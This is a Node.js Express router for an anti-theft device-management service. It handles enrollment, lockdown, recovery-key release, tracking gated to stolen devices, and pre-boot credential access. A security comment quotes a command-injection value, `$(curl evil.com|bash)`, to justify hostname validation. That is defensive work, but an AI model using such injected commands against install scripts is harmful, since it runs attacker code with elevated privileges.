const express = require('express');
const pool = require('../db/pool');
const { getDeviceById, getDeviceByPblDeviceId, setPblDeviceId, clearPblDeviceId } = require('../db/deviceQueries');
const { requireAuth, requireRole } = require('../middleware/auth');
const { withTransaction } = require('../db/withTransaction');
const { generateApiKey, hashApiKey } = require('../db/apiKey');
const { groupPbaCredentials } = require('../db/pbaCredentials');
const { readDualMode } = require('../db/fieldCrypto');
const { sendNotification } = require('../notifications/notify');
const { createSharedEnv } = require('../pbl/kvStore');

const router = express.Router();

/** D-206: Sync agent device status to the linked PBL device in KV.
 *  Best-effort — does not fail the agent operation if the PBL KV is unavailable.
 *  @param {object} agentDevice  Agent device record (must have pbl_device_id)
 *  @param {string} pblStatus     PBL status to set ('locked'|'active'|'tracking')
 */
async function syncAgentStatusToPbl(agentDevice, pblStatus) {
  if (!agentDevice || !agentDevice.pbl_device_id) return;
  try {
    const env = createSharedEnv();
    const key = `pbl_devices:${agentDevice.pbl_device_id}`;
    const data = await env.LOCKDOWN_KV.get(key, 'text');
    if (!data) return;  // PBL device not found in KV
    const device = JSON.parse(data);
    device.status = pblStatus;
    if (pblStatus === 'active') {
      delete device.lock_reason;
    } else if (pblStatus === 'locked') {
      device.lock_reason = 'admin_lock';
    } else if (pblStatus === 'tracking') {
      device.lock_reason = 'reported_stolen';
    }
    await env.LOCKDOWN_KV.put(key, JSON.stringify(device));
  } catch (syncErr) {
    // Best-effort — don't fail the agent operation
  }
}

/**
 * Validate a device hostname at creation time.
 *
 * Security: device.hostname is admin-supplied and later interpolated into
 * generated PowerShell/bash install scripts (see routes/installer.js). An
 * unvalidated value like `$(curl evil.com|bash)` would execute on the install
 * target with elevated privileges. This restricts hostnames to a safe charset
 * at the input boundary — the same [a-z0-9-] discipline installer.js already
 * applies to the ZIP filename, but here at the actual input point.
 *
 * Rules (RFC 952/1123 label subset):
 *   - non-empty string, 1-63 chars
 *   - only [a-zA-Z0-9-]
 *   - must start and end with an alphanumeric (no leading/trailing dash)
 *
 * @param {string} hostname
 * @returns {{ ok: boolean, error?: string }}
 */
function validateHostname(hostname) {
  if (typeof hostname !== 'string' || hostname.length === 0) {
    return { ok: false, error: 'hostname must be a non-empty string' };
  }
  if (hostname.length > 63) {
    return { ok: false, error: 'hostname must be 63 characters or fewer' };
  }
  if (!/^[a-zA-Z0-9-]+$/.test(hostname)) {
    return { ok: false, error: 'hostname may only contain letters, digits, and hyphens' };
  }
  if (!/^[a-zA-Z0-9]/.test(hostname) || !/[a-zA-Z0-9]$/.test(hostname)) {
    return { ok: false, error: 'hostname must start and end with a letter or digit' };
  }
  return { ok: true };
}

/**
 * Phase 5: Default command expiry (30 days).
 * Configurable via COMMAND_EXPIRY_DAYS env var.
 */
const COMMAND_EXPIRY_DAYS = parseInt(process.env.COMMAND_EXPIRY_DAYS || '30', 10);

// Defense-in-depth: validate that COMMAND_EXPIRY_DAYS is a positive integer.
// parseInt with radix 10 already strips non-numeric suffixes, but we add an
// explicit check to ensure the value is safe for SQL interpolation.
if (!Number.isInteger(COMMAND_EXPIRY_DAYS) || COMMAND_EXPIRY_DAYS <= 0) {
  throw new Error(`COMMAND_EXPIRY_DAYS must be a positive integer, got: ${COMMAND_EXPIRY_DAYS}`);
}

/**
 * Phase 5: Build the expires_at SQL fragment for command insertion.
 * Returns a SQL expression for use in INSERT.
 * COMMAND_EXPIRY_DAYS is validated as a positive integer at module load,
 * so interpolation is safe here.
 */
function commandExpirySql() {
  // Use NOW() + INTERVAL so it works with both PG and SQLite (via translation)
  return `NOW() + INTERVAL '${COMMAND_EXPIRY_DAYS} days'`;
}

// Phase 5: the two command-insert shapes. COMMAND_EXPIRY_DAYS is validated as a
// positive integer at module load (parseInt + Number.isInteger + > 0), so the
// interpolated fragment cannot carry injected text. Kept as named constants so
// the SQL lives next to that safety argument instead of inline at each call.
const INSERT_COMMAND_SQL = `INSERT INTO commands (device_id, command_type, expires_at) VALUES ($1, $2, ${commandExpirySql()}) RETURNING *`;
const INSERT_COMMAND_WITH_PBA_SQL = `INSERT INTO commands (device_id, command_type, expires_at, enable_pba) VALUES ($1, $2, ${commandExpirySql()}, $3) RETURNING *`;

/**
 * Strip server-only columns before a device row goes over the wire.
 *
 * Device rows come from `SELECT *` / `RETURNING *`, so they carry
 * `api_key_hash` — a SHA-256 of the device's API key. No client needs it, and
 * shipping it only enables offline guessing. The column stays in the database
 * (routes/agent.js authenticates against it); it is removed here, at the
 * serialisation boundary, for every response that returns a device.
 */
function publicDevice(row) {
  if (!row) return row;
  const device = { ...row };
  delete device.api_key_hash;
  return device;
}

/**
 * FA5: Decrypt sensitive location fields for a row (dual-mode read).
 * Returns a new row with decrypted values for lat/lon/city/region/ip.
 */
function decryptLocationFields(row) {
  if (!row) return null;
  return {
    ...row,
    latitude: row.latitude_enc ? parseFloat(readDualMode(
      row, 'latitude', 'latitude_enc', 'lat_enc_nonce', 'lat_enc_tag', 'LOCATION_FIELD_KEY'
    )) : row.latitude,
    longitude: row.longitude_enc ? parseFloat(readDualMode(
      row, 'longitude', 'longitude_enc', 'lon_enc_nonce', 'lon_enc_tag', 'LOCATION_FIELD_KEY'
    )) : row.longitude,
    city: readDualMode(row, 'city', 'city_enc', 'city_enc_nonce', 'city_enc_tag', 'LOCATION_FIELD_KEY') || row.city,
    region: readDualMode(row, 'region', 'region_enc', 'region_enc_nonce', 'region_enc_tag', 'LOCATION_FIELD_KEY') || row.region,
    ip_address: readDualMode(row, 'ip_address', 'ip_address_enc', 'ip_enc_nonce', 'ip_enc_tag', 'LOCATION_FIELD_KEY') || row.ip_address,
  };
}

router.get('/', requireAuth, async (_req, res) => {
  const result = await pool.query(
    'SELECT * FROM devices ORDER BY enrolled_at DESC'
  );
  res.json(result.rows.map(publicDevice));
});

router.get('/:id', requireAuth, async (req, res) => {
  const device = await getDeviceById(req.params.id);
  if (!device) return res.status(404).json({ error: 'Device not found. Verify the device ID is correct and the device is enrolled in the system.' });
  res.json(publicDevice(device));
});

router.post('/', requireAuth, requireRole('operator'), async (req, res) => {
  const { hostname, owner_name } = req.body;
  if (!hostname || !owner_name) return res.status(400).json({ error: 'hostname and owner_name required. Provide both fields in the request body.' });

  // Security: validate hostname charset at the input boundary. hostname is
  // later interpolated into generated install scripts (see routes/installer.js);
  // an unsafe value would allow command injection on the install target.
  const hostnameCheck = validateHostname(hostname);
  if (!hostnameCheck.ok) {
    return res.status(400).json({ error: hostnameCheck.error });
  }

  // FA3: Generate a per-device API key at enrollment.
  // The plaintext key is returned ONCE and never stored server-side.
  // The admin provisions it onto the device out-of-band (like a TOTP seed).
  const apiKey = generateApiKey();
  const apiKeyHash = hashApiKey(apiKey);

  try {
    const result = await pool.query(
      'INSERT INTO devices (hostname, owner_name, api_key_hash) VALUES ($1, $2, $3) RETURNING *',
      [hostname, owner_name, apiKeyHash]
    );
    await pool.query(
      'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
      [result.rows[0].id, req.admin.id, 'device_enrolled', { hostname, owner_name }]
    );
    // Return the device + the plaintext API key (shown once). The plaintext is
    // deliberate; the stored hash is not — publicDevice strips it.
    res.status(201).json({
      ...publicDevice(result.rows[0]),
      api_key: apiKey, // plaintext — capture now, never shown again
    });
  } catch (err) {
    if (err.code === '23505') return res.status(409).json({ error: 'Hostname already registered. Choose a different hostname or use the existing device.' });
    throw err;
  }
});

router.patch('/:id', requireAuth, requireRole('operator'), async (req, res) => {
  const { owner_name } = req.body;
  if (owner_name !== undefined && (typeof owner_name !== 'string' || owner_name.length > 200)) {
    return res.status(400).json({ error: 'owner_name must be a string of 200 characters or less. Shorten the value.' });
  }
  const result = await pool.query(
    'UPDATE devices SET owner_name = COALESCE($1, owner_name) WHERE id = $2 RETURNING *',
    [owner_name, req.params.id]
  );
  if (!result.rows[0]) return res.status(404).json({ error: 'Device not found. Verify the device ID is correct and the device is enrolled in the system.' });
  res.json(publicDevice(result.rows[0]));
});

router.delete('/:id', requireAuth, requireRole('operator'), async (req, res) => {
  const { force } = req.query;
  try {
    // A6/CC14: The guard_device_delete trigger prevents deleting devices
    // with unreleased encryption keys. Admins must recover first or use ?force=true.
    if (force === 'true') {
      // Force-delete: release all keys first, then delete
      await withTransaction(async (client) => {
        await client.query('UPDATE encryption_keys SET released_at = NOW() WHERE device_id = $1 AND released_at IS NULL', [req.params.id]);
        const result = await client.query('DELETE FROM devices WHERE id = $1 RETURNING id', [req.params.id]);
        if (!result.rows[0]) {
          throw { status: 404, message: 'Device not found' };
        }
        return result.rows[0].id;
      });
      return res.json({ deleted: req.params.id, forced: true });
    }

    const result = await pool.query('DELETE FROM devices WHERE id = $1 RETURNING id', [req.params.id]);
    if (!result.rows[0]) return res.status(404).json({ error: 'Device not found. Verify the device ID is correct and the device is enrolled in the system.' });
    res.json({ deleted: result.rows[0].id });
  } catch (err) {
    // A6: Guard trigger raises a P0001 exception with a helpful message
    if (err.code === 'P0001' || (err.message && err.message.includes('unreleased encryption keys'))) {
      return res.status(409).json({
        error: 'Cannot delete device with unreleased encryption keys',
        hint: 'Recover the device first, or use ?force=true to release keys and delete',
      });
    }
    if (err.status === 404) return res.status(404).json({ error: 'Device not found' });
    throw err;
  }
});

router.post('/:id/flag-stolen', requireAuth, requireRole('operator'), async (req, res) => {
  const { hostname_confirm, enable_pba } = req.body;

  const device = await getDeviceById(req.params.id);
  if (!device) return res.status(404).json({ error: 'Device not found. Verify the device ID is correct and the device is enrolled in the system.' });
  if (device.hostname !== hostname_confirm) {
    return res.status(400).json({ error: 'Confirmation hostname does not match. Enter the device hostname exactly as it appears in the device list.' });
  }
  if (device.status === 'stolen') {
    return res.status(409).json({ error: 'Device already flagged as stolen. Use the recover endpoint to unlock it.' });
  }

  // T7/T8: enable_pba is an opt-in flag (Q1=A, default false). When true,
  // the agent sets an HP Power-On Password for Tier 1 pre-boot authentication.
  // This sacrifices remote recoverability (a rebooted PBA device can't boot
  // to receive unlock commands) for stronger data protection.
  const enablePba = enable_pba === true;

  // A2: Wrap status update + command insert + audit log in a transaction
  const cmd = await withTransaction(async (client) => {
    await client.query('UPDATE devices SET status = $1 WHERE id = $2', ['stolen', device.id]);
    const cmdResult = await client.query(
      INSERT_COMMAND_WITH_PBA_SQL,
      [device.id, 'lockdown', enablePba]
    );
    await client.query(
      'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
      [device.id, req.admin.id, 'flag_stolen', {
        command_id: cmdResult.rows[0].id,
        enable_pba: enablePba,
      }]
    );
    return cmdResult.rows[0];
  });

  // Fire-and-forget notification — admin gets alerted the instant a device
  // is flagged stolen, even if they're not watching the dashboard.
  sendNotification('device_flagged_stolen', {
    deviceId: device.id,
    hostname: device.hostname,
    ownerName: device.owner_name,
    adminId: req.admin.id,
    commandId: cmd.id,
  });

  // D-206: Bidirectional status sync — agent stolen → PBL device locked
  await syncAgentStatusToPbl(device, 'locked');

  res.json({ device: { ...publicDevice(device), status: 'stolen' }, command: cmd });
});

router.post('/:id/recover', requireAuth, requireRole('operator'), async (req, res) => {
  const { hostname_confirm } = req.body;

  const device = await getDeviceById(req.params.id);
  if (!device) return res.status(404).json({ error: 'Device not found. Verify the device ID is correct and the device is enrolled in the system.' });
  if (device.hostname !== hostname_confirm) {
    return res.status(400).json({ error: 'Confirmation hostname does not match. Enter the device hostname exactly as it appears in the device list.' });
  }
  if (device.status !== 'stolen' && device.status !== 'locked') {
    return res.status(409).json({ error: "Device is not in a locked/stolen state. Only devices with status 'stolen' or 'locked' can be recovered." });
  }

  // A2: Wrap status update + key release + command insert + audit log in a transaction
  const { cmd, key } = await withTransaction(async (client) => {
    // Set transitional 'recovering' status — the agent ACK for the unlock
    // command will flip this to 'active' once decryption is confirmed.
    await client.query('UPDATE devices SET status = $1 WHERE id = $2', ['recovering', device.id]);

    const keyResult = await client.query(
      'SELECT * FROM encryption_keys WHERE device_id = $1 AND released_at IS NULL ORDER BY created_at DESC LIMIT 1',
      [device.id]
    );
    const keyRow = keyResult.rows[0] || null;
    if (keyRow) {
      await client.query('UPDATE encryption_keys SET released_at = NOW() WHERE id = $1', [keyRow.id]);
    }

    const cmdResult = await client.query(
      INSERT_COMMAND_SQL,
      [device.id, 'unlock']
    );
    await client.query(
      'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
      [device.id, req.admin.id, 'recover_device', { command_id: cmdResult.rows[0].id }]
    );
    return { cmd: cmdResult.rows[0], key: keyRow };
  });

  // CC16: Dual-mode read for key_material — decrypt if encrypted, fall back to plaintext
  const { readDualMode } = require('../db/fieldCrypto');
  const keyMaterial = key ? readDualMode(
    key, 'key_material', 'key_material_encrypted', 'key_enc_nonce', 'key_enc_tag'
  ) : null;

  // S4: role-scoped key reads + audit. Recovery-key MATERIAL is sensitive
  // disclosure — return the plaintext only to super-admin. Operators still
  // learn the key was released (the agent retrieves it via checkin), but
  // the response withholds the material for non-super-admin roles.
  const discloseKey = req.admin.role === 'super-admin' && keyMaterial != null;
  if (keyMaterial != null) {
    try {
      await pool.query(
        'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
        [device.id, req.admin.id, 'key_material_read', {
          command_id: cmd.id,
          role: req.admin.role,
          disclosed: discloseKey,
        }]
      );
    } catch (auditErr) { /* audit is best-effort — don't fail recovery */ }
  }

  // Fire-and-forget notification — admin gets confirmation that recovery
  // has been initiated and the unlock key has been released to the agent.
  sendNotification('device_recovery_initiated', {
    deviceId: device.id,
    hostname: device.hostname,
    ownerName: device.owner_name,
    adminId: req.admin.id,
    keyReleased: !!key,
  });

  // D-206: Bidirectional status sync — agent recovering → PBL device active
  await syncAgentStatusToPbl(device, 'active');

  res.json({
    device: { ...publicDevice(device), status: 'recovering' },
    command: cmd,
    key_released: !!key,
    // S4: plaintext material only for super-admin; operators get the
    // release confirmation without the secret itself.
    key_material: discloseKey ? keyMaterial : null,
    key_material_disclosed: discloseKey,
  });
});

/**
 * FA3: Rotate a device's API key.
 * Generates a new per-device key, stores the new hash, returns the plaintext once.
 * The old key immediately stops working.
 */
router.post('/:id/rotate-key', requireAuth, requireRole('super-admin'), async (req, res) => {
  const device = await getDeviceById(req.params.id);
  if (!device) return res.status(404).json({ error: 'Device not found. Verify the device ID is correct and the device is enrolled in the system.' });

  const newApiKey = generateApiKey();
  const newHash = hashApiKey(newApiKey);

  await pool.query('UPDATE devices SET api_key_hash = $1 WHERE id = $2', [newHash, device.id]);
  await pool.query(
    'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
    [device.id, req.admin.id, 'api_key_rotated', {}]
  );

  res.json({
    device_id: device.id,
    hostname: device.hostname,
    api_key: newApiKey, // plaintext — shown once, provision to device out-of-band
  });
});

/**
 * Start covert tracking — sends a 'track' command to the agent.
 * The device remains fully usable; the agent silently reports geolocation.
 *
 * FA5: Status gating — track is only allowed when the device is in a
 * distressed state (stolen, locked, recovering). Covert tracking of an
 * active/healthy device is unjustified.
 */
router.post('/:id/track', requireAuth, requireRole('operator'), async (req, res) => {
  const device = await getDeviceById(req.params.id);
  if (!device) return res.status(404).json({ error: 'Device not found. Verify the device ID is correct and the device is enrolled in the system.' });
  if (device.status === 'tracking') {
    return res.status(409).json({ error: 'Device is already being tracked. Use the stop-track endpoint before starting a new tracking session.' });
  }
  // FA5: Gate track to distressed states only
  const trackAllowed = ['stolen', 'locked', 'recovering'];
  if (!trackAllowed.includes(device.status)) {
    await pool.query(
      'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
      [device.id, req.admin.id, 'track_denied', { status: device.status }]
    );
    return res.status(403).json({
      error: `Tracking not permitted for device status '${device.status}'. ` +
        'Allowed statuses: stolen, locked, recovering.',
    });
  }

  const cmd = await pool.query(
    INSERT_COMMAND_SQL,
    [device.id, 'track']
  );
  await pool.query(
    'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
    [device.id, req.admin.id, 'start_tracking', { command_id: cmd.rows[0].id }]
  );

  // D-206: Bidirectional status sync — agent tracking → PBL device tracking
  await syncAgentStatusToPbl(device, 'tracking');

  res.json({ device, command: cmd.rows[0] });
});

/**
 * One-time location request — sends a 'locate' command to the agent.
 * The agent reports its current location once, without entering tracking mode.
 *
 * FA5: Status gating — locate is allowed for distressed states AND tracking
 * (since tracking implies the device was already approved for location
 * collection). Locate on an active/healthy device is the real over-collection
 * hole — it allows one-shot location of a healthy device with no justification.
 */
router.post('/:id/locate', requireAuth, requireRole('operator'), async (req, res) => {
  const device = await getDeviceById(req.params.id);
  if (!device) return res.status(404).json({ error: 'Device not found. Verify the device ID is correct and the device is enrolled in the system.' });
  // FA5: Gate locate to distressed + tracking states
  const locateAllowed = ['stolen', 'locked', 'recovering', 'tracking'];
  if (!locateAllowed.includes(device.status)) {
    await pool.query(
      'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
      [device.id, req.admin.id, 'locate_denied', { status: device.status }]
    );
    return res.status(403).json({
      error: `Location request not permitted for device status '${device.status}'. ` +
        'Allowed statuses: stolen, locked, recovering, tracking.',
    });
  }

  const cmd = await pool.query(
    INSERT_COMMAND_SQL,
    [device.id, 'locate']
  );
  await pool.query(
    'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
    [device.id, req.admin.id, 'locate_requested', { command_id: cmd.rows[0].id }]
  );

  res.json({ device, command: cmd.rows[0] });
});

/**
 * Stop covert tracking — sends a 'stop_track' command to the agent.
 */
router.post('/:id/stop-track', requireAuth, requireRole('operator'), async (req, res) => {
  const device = await getDeviceById(req.params.id);
  if (!device) return res.status(404).json({ error: 'Device not found. Verify the device ID is correct and the device is enrolled in the system.' });
  if (device.status !== 'tracking') {
    return res.status(409).json({ error: 'Device is not being tracked. Only devices with status "tracking" can be stopped.' });
  }

  const cmd = await pool.query(
    INSERT_COMMAND_SQL,
    [device.id, 'stop_track']
  );
  await pool.query(
    'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
    [device.id, req.admin.id, 'stop_tracking', { command_id: cmd.rows[0].id }]
  );

  // D-206: Bidirectional status sync — agent stop-track → PBL device active
  await syncAgentStatusToPbl(device, 'active');

  res.json({ device, command: cmd.rows[0] });
});

/**
 * Get location history for a device.
 * FA5: Decrypts sensitive location fields before returning to the dashboard.
 */
router.get('/:id/locations', requireAuth, async (req, res) => {
  const limit = Math.min(parseInt(req.query.limit) || 50, 500);
  const result = await pool.query(
    `SELECT * FROM location_reports
     WHERE device_id = $1
     ORDER BY reported_at DESC
     LIMIT $2`,
    [req.params.id, limit]
  );
  // FA5: Decrypt sensitive fields for dashboard display
  res.json(result.rows.map(decryptLocationFields));
});

/**
 * Get the latest known location for a device.
 * FA5: Decrypts sensitive location fields before returning to the dashboard.
 */
router.get('/:id/location/latest', requireAuth, async (req, res) => {
  const result = await pool.query(
    `SELECT * FROM location_reports
     WHERE device_id = $1
     ORDER BY reported_at DESC
     LIMIT 1`,
    [req.params.id]
  );
  if (!result.rows[0]) return res.status(404).json({ error: 'No location data. The device has not reported any location reports yet.' });
  res.json(decryptLocationFields(result.rows[0]));
});

/**
 * Phase 7: Release device from account (ownership transfer / GDPR erasure).
 *
 * This endpoint:
 *   1. Verifies the device is not currently locked/stolen (safety check)
 *   2. Deletes all data associated with the device:
 *      - location_reports
 *      - encryption_keys
 *      - bios_passwords
 *      - commands
 *      - audit_log entries (anonymized, not deleted)
 *   3. Deletes the device record itself
 *   4. The CASCADE foreign key handles most deletions automatically
 *
 * The device must be in 'active' status to be released. If it's locked
 * or stolen, the admin must first recover it (unlock + decrypt).
 */
router.delete('/:id/release', requireAuth, requireRole('operator'), async (req, res) => {
  const { hostname_confirm } = req.body;

  const device = await getDeviceById(req.params.id);
  if (!device) return res.status(404).json({ error: 'Device not found. Verify the device ID is correct and the device is enrolled in the system.' });

  // Safety: require hostname confirmation
  if (device.hostname !== hostname_confirm) {
    return res.status(400).json({ error: 'Confirmation hostname does not match. Enter the device hostname exactly as it appears in the device list.' });
  }

  // Safety: can't release a locked or stolen device
  if (['locked', 'stolen', 'recovering'].includes(device.status)) {
    return res.status(409).json({
      error: `Cannot release a device in '${device.status}' state. Recover (unlock) the device first.`,
    });
  }

  // Phase 7: Anonymize audit log entries (keep for accountability, remove PII)
  await pool.query(
    `UPDATE audit_log SET detail = jsonb_set(
       COALESCE(detail, '{}'::jsonb),
       '{released_at}', to_jsonb(to_char(NOW(), 'YYYY-MM-DD"T"HH24:MI:SS"Z"'))
     ) WHERE device_id = $1`,
    [device.id]
  );

  // Log the release action BEFORE deleting the device (so device_id is valid)
  await pool.query(
    'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
    [device.id, req.admin.id, 'device_released', {
      hostname: device.hostname,
      owner_name: device.owner_name,
    }]
  );

  // Delete the device — CASCADE will remove location_reports, encryption_keys,
  // bios_passwords, and commands. Audit log entries have ON DELETE SET NULL
  // so they're preserved (with device_id = NULL) for accountability.
  await pool.query('DELETE FROM devices WHERE id = $1', [device.id]);

  res.json({
    ok: true,
    message: `Device '${device.hostname}' has been released. All associated data has been deleted. Audit log entries have been anonymized.`,
  });
});

/**
 * Phase 7: Get data retention settings.
 * Returns the current retention configuration.
 */
router.get('/settings/retention', requireAuth, async (_req, res) => {
  const locationRetentionDays = parseInt(process.env.LOCATION_RETENTION_DAYS || '90', 10);
  const commandExpiryDays = parseInt(process.env.COMMAND_EXPIRY_DAYS || '30', 10);
  res.json({
    location_retention_days: locationRetentionDays,
    command_expiry_days: commandExpiryDays,
    audit_log_retention_days: 365, // hardcoded for now
    min_location_retention: 7,
    max_location_retention: 180,
  });
});

/**
 * T10: Get PBA credentials for a device (admin-only).
 *
 * Returns decrypted PBA credentials for the PBA Recovery panel in the
 * dashboard. This is the operator-facing path for recovering a rebooted
 * PBA device — the operator needs the BitLocker PIN, 48-digit recovery
 * password, HP Power-On Password, and HP Setup Password to enter at the
 * pre-boot prompt.
 *
 * Q10=C: Both dashboard feature AND documentation. This endpoint powers
 * the dashboard; docs/PBA_RECOVERY_RUNBOOK.md is the fallback.
 */
router.get('/:id/pba-credentials', requireAuth, requireRole('super-admin'), async (req, res) => {
  const { id } = req.params;

  // Verify device exists
  const device = await getDeviceById(id);
  if (!device) {
    return res.status(404).json({ error: 'Device not found. Verify the device ID is correct and the device is enrolled in the system.' });
  }

  // Fetch all bios_passwords for the device, grouped by password_type
  const pwResult = await pool.query(
    `SELECT * FROM bios_passwords WHERE device_id = $1 ORDER BY created_at DESC`,
    [id]
  );

  const credentials = groupPbaCredentials(pwResult.rows);

  // Audit log the credential access (security trail)
  await pool.query(
    'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
    [id, req.admin.id, 'pba_credentials_accessed', {
      hostname: device.hostname,
      credential_types: Object.entries(credentials)
        .filter(([, v]) => v !== null)
        .map(([k]) => k),
    }]
  );

  res.json(credentials);
});

// ---------------------------------------------------------------------------
// D-206: PBL device identity mapping
// ---------------------------------------------------------------------------

/**
 * POST /api/devices/:id/link-pbl
 * Link an agent device to its PBL (pre-boot) identity.
 * Body: { pbl_device_id: string } — 64 hex chars (32 bytes).
 * Operator+ only. The PBL device_id must not be linked to another agent device.
 */
router.post('/:id/link-pbl', requireAuth, requireRole('operator'), async (req, res) => {
  const { pbl_device_id } = req.body;
  if (!pbl_device_id || typeof pbl_device_id !== 'string') {
    return res.status(400).json({ error: 'pbl_device_id is required' });
  }
  if (pbl_device_id.length !== 64 || !/^[0-9a-fA-F]+$/.test(pbl_device_id)) {
    return res.status(400).json({ error: 'pbl_device_id must be 64 hex chars (32 bytes)' });
  }

  const device = await getDeviceById(req.params.id);
  if (!device) return res.status(404).json({ error: 'Device not found' });

  // Check if PBL device_id is already linked to a different agent device
  const existing = await getDeviceByPblDeviceId(pbl_device_id);
  if (existing && existing.id !== device.id) {
    return res.status(409).json({
      error: 'PBL device_id already linked to another agent device',
      linked_device_id: existing.id,
    });
  }

  const updated = await setPblDeviceId(device.id, pbl_device_id);
  if (!updated) return res.status(404).json({ error: 'Device not found' });

  await pool.query(
    'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
    [device.id, req.admin.id, 'pbl_device_linked', { pbl_device_id }],
  );

  res.json({ linked: true, device_id: device.id, pbl_device_id });
});

/**
 * POST /api/devices/:id/unlink-pbl
 * Unlink a PBL device_id from an agent device.
 * Operator+ only.
 */
router.post('/:id/unlink-pbl', requireAuth, requireRole('operator'), async (req, res) => {
  const device = await getDeviceById(req.params.id);
  if (!device) return res.status(404).json({ error: 'Device not found' });

  if (!device.pbl_device_id) {
    return res.status(400).json({ error: 'Device has no PBL device_id linked' });
  }

  const updated = await clearPblDeviceId(device.id);
  if (!updated) return res.status(404).json({ error: 'Device not found' });

  await pool.query(
    'INSERT INTO audit_log (device_id, admin_id, action, detail) VALUES ($1, $2, $3, $4)',
    [device.id, req.admin.id, 'pbl_device_unlinked', { pbl_device_id: device.pbl_device_id }],
  );

  res.json({ unlinked: true, device_id: device.id });
});

/**
 * GET /api/devices/by-pbl/:pblDeviceId
 * Look up an agent device by its PBL device_id.
 * Operator+ only.
 */
router.get('/by-pbl/:pblDeviceId', requireAuth, requireRole('operator'), async (req, res) => {
  const { pblDeviceId } = req.params;
  if (pblDeviceId.length !== 64 || !/^[0-9a-fA-F]+$/.test(pblDeviceId)) {
    return res.status(400).json({ error: 'pbl_device_id must be 64 hex chars' });
  }

  const device = await getDeviceByPblDeviceId(pblDeviceId);
  if (!device) return res.status(404).json({ error: 'No agent device linked to this PBL device_id' });

  res.json(publicDevice(device));
});

module.exports = router;
module.exports.syncAgentStatusToPbl = syncAgentStatusToPbl;
